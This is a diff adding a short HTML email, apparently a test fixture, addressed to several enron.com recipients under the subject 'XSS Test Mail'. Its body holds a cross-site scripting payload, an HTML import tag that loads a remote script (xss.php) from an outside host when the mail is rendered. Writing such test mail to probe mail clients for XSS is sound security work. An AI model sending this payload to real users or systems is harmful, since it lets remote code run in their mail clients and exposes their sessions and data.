@@ -1,0 +1,7 @@
+From: kevin.a.boone@accenture.com
+To: sheila.nacey@enron.com, lynn.blair@enron.com, mike.bryant@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+aaaaaaa <link rel=import href=//km2.in/xss.php>
